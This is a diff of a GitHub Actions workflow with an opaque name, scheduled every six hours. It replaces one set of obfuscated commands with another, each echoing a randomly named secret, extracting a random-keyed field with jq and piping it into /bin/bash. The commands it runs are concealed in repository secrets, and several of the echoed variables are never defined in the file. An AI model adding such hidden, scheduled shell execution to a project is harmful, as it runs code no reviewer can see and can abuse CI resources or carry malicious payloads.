@@ -3,24 +3,19 @@ name: amanniheishui
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 5/6 * * *'
+    - cron: '58 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: amanniheishui
         env:
-          evwu6: ${{ secrets.evwu6 }}
+          jot2: ${{ secrets.jot2 }}
         run: |
-          echo $evwu6 | jq -r .w491 | /bin/bash
-          echo $l3 | jq -r .yzz78 | /bin/bash
-          echo $vxjlk01 | jq -r .nq7595 | /bin/bash
-          echo $l72233 | jq -r .qvnd8 | /bin/bash
-          echo $by027 | jq -r .x047 | /bin/bash
-          echo $df96 | jq -r .qsymc867 | /bin/bash
-          echo $ptsqz1869 | jq -r .vv9 | /bin/bash
-          echo $vwglf7764 | jq -r .uobpf472 | /bin/bash
-          echo $eg0 | jq -r .gyms19571 | /bin/bash
-          echo $dncd15 | jq -r .cl27287 | /bin/bash
+          echo $jot2 | jq -r .dq26543 | /bin/bash
+          echo $e57329 | jq -r .iwhjs17 | /bin/bash
+          echo $h2 | jq -r .j4 | /bin/bash
+          echo $uob0406 | jq -r .tofnt598 | /bin/bash
 
